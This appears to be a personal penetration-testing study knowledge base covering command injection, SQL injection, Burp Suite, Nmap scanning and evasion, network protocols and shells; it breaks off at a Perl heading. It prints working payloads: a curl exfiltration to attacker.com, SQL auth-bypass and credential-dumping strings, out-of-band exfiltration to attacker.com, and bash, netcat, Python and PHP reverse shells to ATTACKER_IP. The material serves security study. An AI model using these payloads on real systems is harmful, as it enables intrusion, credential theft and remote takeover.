# Penetration Testing Knowledge Base

#pentesting #security #hacking #cybersecurity

---

## Table of Contents
- [Command Injection](#command-injection)
- [SQL Injection](#sql-injection)
- [Burp Suite](#burp-suite)
- [Reconnaissance](#reconnaissance)
- [NMAP](#nmap)
- [Network Protocols](#network-protocols)
- [Shells](#shells)
- [Metasploit](#metasploit)
- [Privilege Escalation - Linux](#privilege-escalation-linux)
- [Privilege Escalation - Windows](#privilege-escalation-windows)
- [Vulnerability Management](#vulnerability-management)

---

## Command Injection

#command-injection #rce #injection

**Also known as:** Remote Code Execution (RCE)

### Overview
Command injection allows an attacker to manipulate input fields to inject malicious code into a vulnerable application. This can lead to:
- Arbitrary commands execution on the targeted server
- Data breaches
- System compromise
- Unintended operations

### Vulnerability Detection
Applications vulnerable to command injection typically:
- Use user input to populate system commands with data
- Lack proper input validation and sanitization

### Shell Operators
Common shell operators used for command injection:
- `;` - Command separator (execute multiple commands)
- `#` - Comment (ignore everything after)
- `&` - Background execution
- `&&` - AND operator (execute if previous succeeds)
- `||` - OR operator (execute if previous fails)
- `|` - Pipe (pass output to next command)

### Detection Methods

#### 1. Blind Command Injection
#blind-injection

- **Characteristic:** No direct output from application when injecting payload
- **Detection:** Verified by observing changes in application behavior
- **Testing techniques:**
  - `ping` - Creates time delay (ICMP packets)
  - `sleep` - Creates time delay (vital for testing payloads)
  - `>` (redirector) - Redirect output to files
  - `curl` - Make external HTTP requests

**Example payloads:**
```bash
; ping -c 10 127.0.0.1 ;
; sleep 10 ;
; curl http://attacker.com/$(whoami) ;
```

#### 2. Verbose Command Injection
#verbose-injection

- **Characteristic:** Direct feedback from application after injecting payload
- **Example:** Using `whoami` and seeing the output directly in the response

**Example payloads:**
```bash
; whoami ;
& cat /etc/passwd &
| id |
```

### Vulnerable Functions

#### PHP Functions
#php-vulnerabilities

Functions that interact with the OS to execute commands via shells:
- `exec()`
- `passthru()`
- `system()`
- `shell_exec()`
- `popen()`
- `` ` `` (backticks)

**Example vulnerable code:**
```php
<?php
$cmd = "ping -c 4 " . $_GET['ip'];
system($cmd);
?>
```

### Bypassing Filters
#bypass #filter-evasion

When input validation/sanitization restricts special characters:

#### Character Restrictions
If special characters like quotation marks are blocked but numbers and letters are allowed:
- Use **hexadecimal encoding** of special characters
- Example: `"` can be represented as `\x22`
- The result may be in a different format but can still be interpreted

#### Common Bypasses
```bash
# Bypass space filtering
${IFS}
$IFS$9
{cat,/etc/passwd}

# Bypass keyword filtering
c''at /etc/passwd
c'a't /etc/passwd
c\at /etc/passwd

# Hex encoding
echo "22" | xxd -r -p  # Outputs "

# Environment variable manipulation
COMMAND=cat
$COMMAND /etc/passwd
```

---

## SQL Injection

#sql-injection #sqli #database

Malicious queries injected into web application databases using user input to inject commands into queries to:
- Steal private data
- Delete data
- Alter private data

### Types of SQL Injection

#### 1. In-Band SQL Injection
#in-band-sqli

**Most common and easiest to detect and exploit**

Characteristics:
- Same method of communication used to exploit the vulnerability and receive results
- Example: Discovering SQLi vulnerability on a web page and seeing results on the same page

##### A. Error-Based SQL Injection
#error-based-sqli

- Most useful for obtaining information about database structure
- Error messages from the database are visible on the web page
- Provides direct feedback about the query structure

**Example payloads:**
```sql
' OR '1'='1
' OR 1=1--
' OR 1=1#
' AND 1=CONVERT(int, (SELECT @@version))--
```

##### B. Union-Based SQL Injection
#union-based-sqli

- Uses `UNION` and `SELECT` commands to return additional results to a page
- Most common way of extracting large amounts of data

**Key Functions:**
- `GROUP_CONCAT()` - Gets specified column from multiple returned rows and puts it into one string separated by commas

**Example payloads:**
```sql
' UNION SELECT NULL--
' UNION SELECT username, password FROM users--
' UNION SELECT 1,2,3--
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

**Information Schema:**
- Every user has access to `information_schema`
- Contains all information about databases and tables the user can access
- Critical for enumeration

**Example enumeration:**
```sql
' UNION SELECT table_name,column_name FROM information_schema.columns--
' UNION SELECT GROUP_CONCAT(username),GROUP_CONCAT(password) FROM users--
```

#### 2. Blind SQL Injection
#blind-sqli

**No direct feedback to confirm if SQL injection works, but it still works**

##### A. Boolean-Based Blind SQLi
#boolean-sqli

- Depends on injection response being yes/no, true/false, on/off, etc.
- Possible to enumerate entire database with two outcomes
- Used for authentication bypass

**Authentication Bypass Examples:**
```sql
admin'--
admin'#
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin' OR '1'='1
username' AND password='anything' OR '1'='1
```

**How it works:**
- Connection between username and password in table vs login form
- Content doesn't matter, only if statement is true or false
- Don't need to enumerate username/password, just need DB query to get True/False answer

**Enumeration Examples:**
```sql
' AND (SELECT COUNT(*) FROM users) > 0--
' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 5--
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
```

##### B. Time-Based Blind SQLi
#time-based-sqli

- Similar to boolean-based except requests are the same
- No visual indicator of right/wrong queries
- Time query takes to complete is the indicator
- `SLEEP()` method only gets executed upon successful `UNION SELECT` statement

**Example payloads:**
```sql
' AND SLEEP(5)--
' UNION SELECT IF(1=1,SLEEP(5),0)--
'; IF (1=1) WAITFOR DELAY '00:00:05'--
' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0) FROM users WHERE username='admin'--
```

#### 3. Out-of-Band SQL Injection
#out-of-band-sqli

- Depends on specific features being enabled in database server
- Classified by having 2 different communication channels:
  1. One to launch the attack (web request)
  2. Other to receive results (HTTP/DNS requests to service you control)
- Launch attack via web request
- Data gathering via monitoring HTTP/DNS requests made to service you can control

**Example payloads:**
```sql
'; EXEC xp_dirtree '\\attacker.com\share'--
'; EXEC xp_cmdshell 'nslookup attacker.com'--
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT+password+FROM+users),'.attacker.com\\a'))--
```

### SQL Injection Defense
#sqli-defense

#### 1. Prepared Statements with Parameterized Queries
#prepared-statements

- Developers first define SQL query
- User input is added afterwards as parameters
- Prevents user input from being interpreted as SQL code

**Example (PHP with MySQLi):**
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

#### 2. Input Validation
#input-validation

- Ensure and verify correct text/number/character appears where relevant
- Whitelist acceptable inputs
- Validate data types and formats

#### 3. Escaping User Input
#input-escaping

- Nullify the effects of special characters like `$`, `'`, `"`, `;`
- Prepend a character (like backslash `\`) to nullify the effects
- Example: `'` becomes `\'`

**Example (PHP):**
```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
```

---

## Burp Suite

#burp-suite #web-testing #proxy

### Burp Suite Repeater
#repeater

Enables modification and resending of intercepted requests to a target of choice.

**Key Features:**
- Take requests captured in Burp Proxy and manipulate them
- Send requests repeatedly
- Create requests from scratch (similar to using cURL)
- Useful for manual exploration and testing of endpoints
- Better to use Proxy first, capture module, then transmit to Repeater for further editing and resending

#### Inspector
#inspector

Supplementary feature to request and response views in Repeater module.

**Capabilities:**
- Experiment with changes using higher-level Inspector
- Affects the equivalent raw version
- Manipulate elements by adding, editing, and removing them

**Examples:**
- Change HTTP method (GET to POST, etc.)
- Switch protocols
- Modify query parameters
- Edit body parameters
- Change cookies/headers
- Modify request headers

**Use Cases:**
- Manual testing for SQL injection
- Bypass web application firewall filters
- Adjust parameters in form submissions

### Burp Suite Intruder
#intruder #fuzzing

Automated request manipulation, fuzzing, and brute forcing.

**Purpose:**
- Repetitive testing with variation in input values
- Brute forcing with wordlists
- Fuzzing attacks

**Common Uses:**
- Brute force usernames and passwords on login screens
- Fuzzing to find sub-directories, endpoints, or virtual hosts
- Similar to tools like `wfuzz` or `ffuf`

#### Intruder Subtabs

##### 1. Positions Tab
#positions

- Select attack type
- Configure where to insert payloads in the request template
- Burp Suite automatically attempts to identify target positions for payloads

##### 2. Payloads Tab
#payloads

Four sections:

**A. Payload Sets:**
- Choose position for which to configure payload set
- Select type of payloads

**B. Payload Settings:**
- Configure payload options

**C. Payload Processing:**
- Define rules to apply to each payload in the set before launching

**D. Payload Encoding:**
- Customize encoding options for payloads
- Default is URL encoding
- Can be overridden

#### Intruder Attack Types
#attack-types

##### 1. Sniper
#sniper

- **Default and most commonly used**
- Cycles through payloads, inserting them one at a time into each position defined in the request
- Iterates through all payloads in linear style
- Best for precise/targeted testing

**Example:**
```
Position 1: §username§
Position 2: §password§

Payload list: admin, user, test

Results in:
1. admin, (no change in position 2)
2. user, (no change in position 2)
3. test, (no change in position 2)
4. (no change in position 1), admin
5. (no change in position 1), user
6. (no change in position 1), test
```

##### 2. Battering Ram
#battering-ram

- Sends all payloads simultaneously
- Each payload inserted into its respective position
- Useful for concurrent payload testing or race conditions

**Example:**
```
Position 1: §username§
Position 2: §password§

Payload: admin

Results in: username=admin, password=admin
```

##### 3. Pitchfork
#pitchfork

- Simultaneous testing of multiple positions with different payloads
- Define multiple payload sets, each associated with a specific position
- Effective for distinct parameters that need separate testing
- Moves through payload sets in lockstep

**Example:**
```
Position 1: §username§
Position 2: §password§

Payload Set 1: admin, user
Payload Set 2: pass123, test456

Results in:
1. username=admin, password=pass123
2. username=user, password=test456
```

##### 4. Cluster Bomb
#cluster-bomb

- Combines Sniper and Pitchfork approaches
- Performs Sniper-like attack on each position but simultaneously using all payloads combined
- Tests all possible combinations
- Useful for multiple positions with multiple payloads

**Example:**
```
Position 1: §username§
Position 2: §password§

Payload Set 1: admin, user
Payload Set 2: pass123, test456

Results in:
1. username=admin, password=pass123
2. username=admin, password=test456
3. username=user, password=pass123
4. username=user, password=test456
```

### Burp Suite Decoder
#decoder

Data manipulation capabilities:

- Decode data during attacks
- Encode your own data for transmission to target
- Create hash sums of data
- Smart decode feature (multi-decoder tool)

**Supported Encodings:**
- URL encoding
- HTML encoding
- Base64
- ASCII hex
- Hex
- Octal
- Binary
- Gzip

### Burp Suite Comparer
#comparer

Compare two pieces of data:
- ASCII word comparison
- Byte-level comparison

**Use Cases:**
- Compare responses to identify minor differences
- Identify changes in application behavior
- Useful for blind SQL injection testing

### Burp Suite Sequencer
#sequencer

Evaluation of entropy/randomness of tokens.

**Purpose:**
- Analyze session tokens
- Test CSRF tokens used to protect form submissions
- Assess randomness/predictability

**Security Concern:**
- If tokens aren't secure, next token can be predicted
- Weak randomness can lead to session hijacking

#### Two Modes:

##### 1. Live Capture
#live-capture

- Pass a request that generates a token for Sequencer to analyze
- Example: POST request to login generates session cookie
- Can perform request thousands of times
- Sends results to Sequencer for analysis

##### 2. Manual Load
#manual-load

- For pre-generated token samples
- Avoids being noisy and resource-heavy on target

### Burp Suite Organizer
#organizer

- Store and annotate copies of HTTP requests for revisiting
- Useful for penetration testing workflow
- Each HTTP request/response is read-only

**Use Cases:**
- Keep track of interesting findings
- Document testing progress
- Organize requests by vulnerability type or severity

---

## Reconnaissance

#reconnaissance #recon #osint

### Passive Reconnaissance
#passive-recon

Relies on publicly available knowledge without direct contact with the target.

**Characteristics:**
- No direct interaction with target system
- Uses publicly available information
- Doesn't alert the target
- Legal and ethical (using public data)

#### WHOIS
#whois

- Request and response protocol
- WHOIS server listens on **TCP Port 43** for incoming requests
- Domain registrar is responsible for maintaining WHOIS record

**Useful Information Includes:**
- **Registrant:** Name, organization, address, phone, email
- **Dates:** Creation, update, and expiration dates
- **Name Server:** Which server to ask to resolve the domain name

**Command:**
```bash
whois domain.com
```

#### DNS Lookup Tools
#dns-lookup

##### nslookup (Name Server Lookup)
#nslookup

Find IP address of domain.

**Commands:**
```bash
nslookup domain.com
nslookup -type=A domain.com     # IPv4 address
nslookup -type=AAAA domain.com  # IPv6 address
nslookup -type=MX domain.com    # Mail exchange servers
nslookup -type=TXT domain.com   # TXT records
```

##### dig (Domain Information Groper)
#dig

More detailed DNS information.

**Commands:**
```bash
dig domain.com
dig domain.com A       # IPv4 address
dig domain.com AAAA    # IPv6 address
dig domain.com MX      # Mail exchange
dig domain.com TXT     # TXT records
dig domain.com ANY     # All records
dig @8.8.8.8 domain.com # Query specific DNS server
```

#### MX Records
#mx-records

- **MX = Mail Exchange**
- Used for passive reconnaissance
- Identifies mail servers for a domain

#### Shodan.io
#shodan

- Tries to connect to every device reachable online
- Builds a search engine of connected "things"
- Contrast with search engines for webpages
- Can discover:
  - Open ports
  - Running services
  - Vulnerable devices
  - Default credentials
  - Exposed databases
  - ICS/SCADA systems

---

### Active Reconnaissance
#active-recon

Interacts directly with the target.

**Characteristics:**
- Direct contact with target system
- Can be detected
- May be logged
- Requires permission/authorization

#### Ping
#ping #icmp

- Uses **ICMP (Internet Control Message Protocol)** packets
- Sent to remote system to check if it's alive
- Measures round-trip time

**Commands:**
```bash
ping target.com
ping -c 4 target.com    # Send 4 packets (Linux)
ping -n 4 target.com    # Send 4 packets (Windows)
```

**ICMP Packet Types:**
- Type 8: Echo Request
- Type 0: Echo Reply

#### Traceroute
#traceroute #tracert

Traces the route taken by packets from your system to target host.

**Purpose:**
- Find IP addresses of routers/hops that a packet traverses
- Reveals number of routers between two systems
- Not always consistent (routers use dynamic routing protocols)

**How It Works:**
- Relies on ICMP packets and getting routers to reveal their IP
- Uses short **Time-to-Live (TTL)** in IP header field
- TTL decrements by 1 after each hop
- When TTL reaches 0, router sends back ICMP "Time Exceeded" message

**Commands:**
```bash
traceroute target.com        # Linux
tracert target.com           # Windows
traceroute -m 15 target.com  # Set max hops
```

**Note:** TTL is not time-based - it's hop-based.

#### Telnet
#telnet

- **Teletype Network**
- **Port 23** - TCP
- Application layer (Layer 7 on OSI model)
- Used for banner grabbing
- Connects remotely to system to access its terminal

**Security Issues:**
- Communications between Telnet client and server are **NOT encrypted**
- Credentials sent in plaintext
- Wireshark can easily reveal username/password

**Banner Grabbing:**
```bash
telnet target.com 80        # Connect to HTTP
GET / HTTP/1.1
Host: target.com

telnet target.com 25        # Connect to SMTP
telnet target.com 21        # Connect to FTP
```

#### Netcat (nc)
#netcat #nc

- "Swiss Army Knife" of networking
- Supports both **UDP** and **TCP**
- Functions as client or server

**Common Uses:**
- Banner grabbing
- Port scanning
- File transfer
- Reverse/bind shells
- Port forwarding

**Commands:**
```bash
nc target.com 80           # Connect to port 80
nc -v target.com 80        # Verbose output
nc -nv target.com 80       # No DNS resolution
nc -lvnp 4444              # Listen on port 4444

# Banner grabbing
echo "GET / HTTP/1.0\r\n\r\n" | nc target.com 80
```

---

## NMAP

#nmap #port-scanning #network-scanner

**Network Mapper** - Most popular port scanner.

### NMAP Scan Steps
#nmap-process

1. Enumerate targets
2. Discover live hosts
3. Reverse-DNS lookup
4. Scan ports
5. Detect versions
6. Detect OS
7. Traceroute
8. Run scripts
9. Write output

### Host Discovery
#host-discovery

#### ARP Scan
#arp-scan

- **ARP (Address Resolution Protocol)** requests to discover live hosts
- Only possible if you're on the same subnet as target systems
- Need to know MAC address before communicating with any system on Ethernet/WiFi
- Better than ICMP Echo if on same subnet

**Commands:**
```bash
nmap -sn target.com              # Ping scan only (no port scan)
nmap -PR 192.168.1.0/24          # ARP scan only
arp-scan -l                      # Using arp-scan tool
arp-scan 192.168.1.0/24
```

#### ICMP Scans
#icmp-scan

##### ICMP Echo
```bash
nmap -PE target.com              # ICMP Echo Request
```

##### ICMP Timestamp
```bash
nmap -PP target.com              # ICMP Timestamp Request
```

##### ICMP Address Mask
```bash
nmap -PM target.com              # ICMP Address Mask Query
```

#### TCP Scans
#tcp-scan

##### TCP SYN Ping
```bash
nmap -PS22,80,443 target.com     # TCP SYN ping on specified ports
nmap -PS target.com              # Default: port 80
```

##### TCP ACK Ping
```bash
nmap -PA22,80,443 target.com     # TCP ACK ping (requires privileges)
```

#### UDP Scan
#udp-ping

```bash
nmap -PU target.com              # UDP ping
```

**Note:** Not supposed to get reply, but indicates live system if ICMP Port Unreachable NOT received.

### DNS Resolution
#dns-resolution

```bash
nmap target.com                  # Default: uses reverse-DNS for online hosts
nmap -n target.com               # Skip reverse-DNS lookup (-n)
nmap -R target.com               # DNS resolution for online AND offline hosts
nmap --dns-servers 8.8.8.8 target.com  # Specify DNS server
```

---

### Port Scanning
#port-scanning

#### Port States
#port-states

1. **Open:** Service is listening on specified port
2. **Closed:** No service listening, but port is accessible (not blocked by firewall)
3. **Filtered:** Cannot determine if open/closed (firewall preventing access)
4. **Unfiltered:** Cannot determine if open/closed, but port is reachable (happens after ACK scan)
5. **Open|Filtered:** Cannot determine if port is open or filtered
6. **Closed|Filtered:** Cannot determine if port is closed or filtered

#### TCP Connect Scan
#tcp-connect

- **Only way** to scan TCP ports if non-privileged user
- Completes full 3-way handshake
- More likely to be logged

```bash
nmap -sT target.com              # TCP connect scan
```

#### TCP SYN Scan
#syn-scan #stealth-scan

- **Requires privileged user** to run
- Breaks connection when server responds (sends RST)
- Reduces chance of scan being logged
- Default scan type for privileged users

```bash
sudo nmap -sS target.com         # TCP SYN scan (stealth)
```

#### UDP Scan
#udp-scan

- Slower than TCP scans
- Open ports typically don't respond
- Closed ports return ICMP Port Unreachable

```bash
sudo nmap -sU target.com         # UDP scan
nmap -sU -sS target.com          # Combined UDP and TCP SYN scan
```

#### Additional Scan Options
#scan-options

```bash
nmap -p 80,443 target.com        # Scan specific ports
nmap -p- target.com              # Scan all 65,535 ports
nmap -p 1-1000 target.com        # Scan port range
nmap -F target.com               # Fast mode (top 100 ports)
nmap --top-ports 10 target.com   # Scan top N ports
nmap -r target.com               # Scan ports in consecutive order
```

### Timing and Performance
#timing #performance

#### Timing Templates
#timing-templates

```bash
nmap -T0 target.com              # Paranoid (IDS evasion)
nmap -T1 target.com              # Sneaky (IDS evasion)
nmap -T2 target.com              # Polite (less bandwidth)
nmap -T3 target.com              # Normal (default)
nmap -T4 target.com              # Aggressive (fast, assumes good network)
nmap -T5 target.com              # Insane (very fast, may miss ports)
```

**Usage Guidelines:**
- **T0 or T1:** Avoiding IDS during real engagements
- **T3:** Default, balanced
- **T4:** CTFs or learning environments
- **T5:** Very fast but unreliable

#### Rate Control
#rate-control

```bash
nmap --min-rate 100 target.com   # Minimum packets per second
nmap --max-rate 100 target.com   # Maximum packets per second
```

#### Parallelization
#parallelization

```bash
nmap --min-parallelism 10 target.com
nmap --max-parallelism 100 target.com
```

---

### Advanced Scan Techniques
#advanced-scans

#### NULL Scan
#null-scan

- Does not set any flags
- All six flag bits set to zero
- Useful against **stateless firewalls**

```bash
nmap -sN target.com
```

**Expected Behavior:**
- **Open|Filtered:** No response from open port (or firewall blocks)
- **Closed:** RST flag returned

#### FIN Scan
#fin-scan

- TCP packet sent with FIN flag set
- Useful against **stateless firewalls**

```bash
nmap -sF target.com
```

**Expected Behavior:**
- **Open|Filtered:** No response from open port
- **Closed:** RST flag returned

#### Xmas Scan
#xmas-scan

- Sets FIN, PSH, and URG flags simultaneously
- Named because flags "light up like a Christmas tree"
- Useful against **stateless firewalls**

```bash
nmap -sX target.com
```

**Expected Behavior:**
- **Open|Filtered:** No response
- **Closed:** RST flag returned

**Firewall Notes:**
- These three scans useful against **stateless firewalls**
- Stateless firewalls check for SYN flag to detect connection attempts
- Using flag combinations without SYN can deceive firewall
- **Does not work** against stateful firewalls

#### TCP Maimon Scan
#maimon-scan

- FIN and ACK bits are set
- Target should send RST packet in response
- Certain BSD-derived systems drop packet if it's an open port (exposing open ports)
- Won't work on most modern systems

```bash
nmap -sM target.com
```

#### TCP ACK Scan
#ack-scan

- More suitable for discovering firewall rule sets and configurations
- Doesn't determine if port is open or closed
- Determines if port is **filtered** or **unfiltered**

```bash
nmap -sA target.com
```

#### TCP Window Scan
#window-scan

- Similar to TCP ACK scan
- Examines TCP window field of RST packets returned
- On specific systems, can reveal open ports
- Better results for servers behind firewalls

```bash
nmap -sW target.com
```

#### Custom Scans
#custom-scan

Create custom flag combinations:

```bash
nmap --scanflags RSTFINACK target.com
nmap --scanflags SYNFIN target.com
```

**Note:** Window and TCP ACK scans are suited to finding/navigating firewall rules but not necessarily services and their state.

---

### Spoofing and Decoys
#spoofing #decoys #evasion

#### IP Spoofing
#ip-spoofing

```bash
nmap -S <SPOOFED_IP> target.com              # Spoof source IP
nmap -S <SPOOFED_IP> -e eth0 target.com      # Specify network interface
nmap -S <SPOOFED_IP> -Pn target.com          # Disable ping scan
```

**Limitations:**
- Only works if you can guarantee response routing back to you
- Unreliable from random networks using spoofed IP
- Specific network setups required (same local network)
- Works on Ethernet or WiFi with proper permissions

#### MAC Spoofing
#mac-spoofing

```bash
nmap --spoof-mac 0 target.com                # Random MAC
nmap --spoof-mac Apple target.com            # Apple MAC
nmap --spoof-mac 00:11:22:33:44:55 target.com # Specific MAC
```

#### Decoys
#decoy-scan

Use multiple spoofed IPs with your real one to hide your actual attacking IP:

```bash
nmap -D RND:10 target.com                    # 10 random decoys
nmap -D decoy1,decoy2,ME,decoy3 target.com   # Specific decoys + your IP
nmap -D 192.168.1.100,192.168.1.101,ME target.com
```

---

### Firewall/IDS Evasion
#firewall-evasion #ids-evasion

#### Packet Fragmentation
#fragmentation

```bash
nmap -f target.com                           # Fragment packets (8 bytes or less)
nmap -ff target.com                          # Fragment into 16-byte fragments
nmap --mtu 16 target.com                     # Custom MTU (must be multiple of 8)
```

**How It Works:**
- IP data divided into small fragments
- Fragments reassembled on recipient side
- ID and fragment offset in IP header used for reassembly
- Minimum TCP header size is 20 bytes
- Makes it harder for firewalls/IDS to inspect

#### Packet Padding
#packet-padding

```bash
nmap --data-length 25 target.com             # Add 25 bytes to packets
```

**Purpose:**
- Increase packet size to hide malicious intentions
- Make packets look like legitimate traffic
- Evade signature-based detection

#### Bad Checksum
#bad-checksum

```bash
nmap --badsum target.com
```

**Purpose:**
- Firewalls might not calculate checksum
- Real systems will drop packets with bad checksum
- Can identify presence of firewall

#### Custom Source Port
#source-port

```bash
nmap --source-port 53 target.com             # Use DNS port
nmap -g 53 target.com                        # Same as above
```

**Common Trusted Ports:**
- 53 (DNS)
- 80 (HTTP)
- 443 (HTTPS)

---

### Idle/Zombie Scan
#idle-scan #zombie-scan

Advanced stealth technique using a "zombie" host.

**Requirements:**
- Idle system connected to network
- You can communicate with idle system
- Idle system must be truly idle

**How It Works:**
1. Trigger idle host to respond - record IP ID value
2. Send SYN/ACK packet to target TCP port using spoofed idle host IP
3. Trigger idle host again - compare new IP ID value

**IP ID Increment Logic:**
- If port **open**: Target sends SYN/ACK to zombie → Zombie sends RST → IP ID increments by 2
- If port **closed**: Target sends RST to zombie → Zombie ignores → IP ID increments by 1
- If port **filtered**: No response → IP ID increments by 1

```bash
nmap -sI zombie_ip target.com
```

---

### Service and OS Detection
#service-detection #os-detection

#### Service Version Detection
#version-detection

```bash
nmap -sV target.com                          # Service version detection
nmap -sV --version-intensity 5 target.com    # Set intensity (0-9)
nmap -sV --version-light target.com          # Light: intensity 2
nmap -sV --version-all target.com            # Aggressive: intensity 9
```

**Note:** `-sV` forces 3-way handshake, so stealth scan not possible.

#### OS Detection
#os-fingerprinting

```bash
nmap -O target.com                           # OS detection
nmap -O --osscan-guess target.com            # Aggressive OS guessing
nmap -O --osscan-limit target.com            # Limit to promising targets
```

**Requirements:**
- At least 1 open port
- At least 1 closed port
- Not always reliable/accurate due to virtualization

#### Aggressive Scan
#aggressive-scan

Combines multiple detection techniques:

```bash
nmap -A target.com                           # Equivalent to: -sV -O -sC --traceroute
```

**Includes:**
- Service version detection (`-sV`)
- OS detection (`-O`)
- Default scripts (`-sC`)
- Traceroute (`--traceroute`)

#### Traceroute
#nmap-traceroute

```bash
nmap --traceroute target.com                 # Find routers between you and target
```

---

### NSE (Nmap Scripting Engine)
#nse #nmap-scripts

#### Script Categories

- **auth:** Authentication related scripts
- **broadcast:** Network broadcast discovery
- **brute:** Brute force attacks
- **default:** Default safe scripts
- **discovery:** Network/service discovery
- **dos:** Denial of Service
- **exploit:** Exploitation scripts
- **external:** External services (e.g., WHOIS)
- **fuzzer:** Fuzzing scripts
- **intrusive:** Intrusive scripts (may crash target)
- **malware:** Malware detection
- **safe:** Safe scripts (won't harm target)
- **version:** Version detection
- **vuln:** Vulnerability detection

#### Running Scripts

```bash
nmap -sC target.com                          # Default scripts
nmap --script vuln target.com                # Vulnerability scripts
nmap --script default,safe target.com        # Multiple categories
nmap --script http-* target.com              # All HTTP scripts
nmap --script "not intrusive" target.com     # Exclude category

# Specific scripts
nmap --script http-sql-injection target.com
nmap --script ssh-brute target.com
nmap --script smb-vuln-ms17-010 target.com

# Script with arguments
nmap --script http-brute --script-args http-brute.path=/admin target.com
```

#### Script Locations

```bash
/usr/share/nmap/scripts/                     # Linux
C:\Program Files\Nmap\scripts\               # Windows
```

#### Update Scripts

```bash
nmap --script-updatedb                       # Update script database
```

---

### Output Options
#nmap-output

```bash
nmap -oN output.txt target.com               # Normal format
nmap -oG output.txt target.com               # Grepable format
nmap -oX output.xml target.com               # XML format
nmap -oS output.txt target.com               # Script kiddie format
nmap -oA output_basename target.com          # All formats

# Examples
nmap -oN scan.txt -oX scan.xml target.com    # Multiple formats
```

---

### Useful NMAP Options
#nmap-options

```bash
nmap -v target.com                           # Verbose output
nmap -vv target.com                          # Very verbose output
nmap -d target.com                           # Debug info
nmap -dd target.com                          # More debug info

nmap --reason target.com                     # Show reason for port state
nmap --open target.com                       # Show only open ports
nmap --packet-trace target.com               # Show packet trace

nmap -6 target.com                           # IPv6 scanning
nmap -A -T4 target.com                       # Aggressive scan with timing
```

---

## Network Protocols

#network-protocols #services

### HTTP/HTTPS
#http #https #web-servers

Popular HTTP servers:
- **Apache**
- **Internet Information Services (IIS)** - Microsoft
- **nginx**

**Default Ports:**
- HTTP: Port 80
- HTTPS: Port 443

#### Telnet for Web Browsing

```bash
telnet <IP> <Port>
GET /path HTTP/1.1
Host: <IP>

# Example
telnet example.com 80
GET / HTTP/1.1
Host: example.com

```

---

### FTP (File Transfer Protocol)
#ftp #file-transfer

Popular FTP servers:
- **vsftpd**
- **ProFTPD**
- **FileZilla Server**

**Default Ports:**
- FTP Control: Port 21
- FTP Data: Port 20 (Active mode)

**FTP Clients:**
- **FileZilla** (GUI)
- **ftp** command (CLI)

#### FTP Modes

##### Active Mode
- Server initiates data connection to client
- Uses port 20 for data
- Can have issues with firewalls

##### Passive Mode
- Client initiates both connections
- Server provides port number for data connection
- Better for firewalls

```bash
ftp target.com
# Login
# Commands:
ls                  # List files
get file.txt        # Download file
put file.txt        # Upload file
binary              # Switch to binary mode
ascii               # Switch to ASCII mode
passive             # Toggle passive mode
bye                 # Exit
```

---

### SMTP (Simple Mail Transfer Protocol)
#smtp #email

Email delivery over Internet requires:

1. **MUA (Mail User Agent)** - Email client (Outlook, Thunderbird, etc.)
2. **MSA (Mail Submission Agent)** - Receives email from MUA
3. **MTA (Mail Transfer Agent)** - Routes email between servers
4. **MDA (Mail Delivery Agent)** - Delivers email to recipient's mailbox

**Email Flow:**
1. MUA sends email to MSA
2. MSA performs error checking and sends to MTA
3. MTA (hosted on same server) routes to recipient's MTA
4. Recipient's MTA (can also function as MSA/MDA)
5. MDA delivers to recipient's mailbox
6. Recipient's MUA retrieves email

**Default Port:** Port 25 (SMTP)

**Related Ports:**
- Port 587 (SMTP Submission)
- Port 465 (SMTPS - deprecated)

---

### POP3 (Post Office Protocol 3)
#pop3 #email

- Downloads emails from MDA server
- **Default Port:** Port 110
- **Secure:** Port 995 (POP3S)

**Characteristics:**
- Downloads emails to local device
- Typically deletes from server after download
- Not suitable for multiple devices
- Simple protocol

```bash
telnet target.com 110
USER username
PASS password
STAT            # Get mailbox statistics
LIST            # List messages
RETR 1          # Retrieve message 1
DELE 1          # Delete message 1
QUIT
```

---

### IMAP (Internet Message Access Protocol)
#imap #email

- Keeps emails on server
- **Default Port:** Port 143
- **Secure:** Port 993 (IMAPS)

**Advantages over POP3:**
- Emails stay on server
- Works with multiple devices
- Folder synchronization
- Partial message retrieval

---

### SSH (Secure Shell)
#ssh #secure-shell

- **Default Port:** Port 22
- Encrypted communication
- Secure remote access
- **SCP (Secure Copy Protocol)** for file transfer

```bash
ssh user@target.com
ssh -p 2222 user@target.com          # Custom port
ssh -i keyfile user@target.com       # Use SSH key

# SCP examples
scp file.txt user@target:/path/      # Upload
scp user@target:/path/file.txt .     # Download
scp -r folder user@target:/path/     # Recursive copy
```

---

### DNS (Domain Name System)
#dns

**DNS over TLS (DoT):** Port 853

**DNS over HTTPS (DoH):** Port 443

---

## Shells

#shells #reverse-shell #bind-shell

### Shell Types

#### Interactive Shells
#interactive-shells

- PowerShell
- Bash
- Zsh
- Any standard CLI environment
- Allow full interaction
- Support features like tab completion, command history

#### Non-Interactive Shells
#non-interactive-shells

- Limited to programs that don't require user interaction
- Can't run programs like `ssh` that need interactive input
- Majority of simple reverse and bind shells are non-interactive
- Commands like `whoami` work (output only)
- Commands like `ssh` don't work (require interaction)

---

### Reverse Shell
#reverse-shell

Target system sends connection back to attacker machine.

**Characteristics:**
- Attacker sets up listener
- Target initiates connection
- Bypasses outbound firewall rules
- Most common in penetration testing

**Attacker Machine (Listener):**
```bash
nc -lvnp 443                         # Netcat listener
# -l: listen mode
# -v: verbose
# -n: no DNS resolution
# -p: port number
```

**Target Machine (Connects back):**
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Netcat
nc ATTACKER_IP PORT -e /bin/bash

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
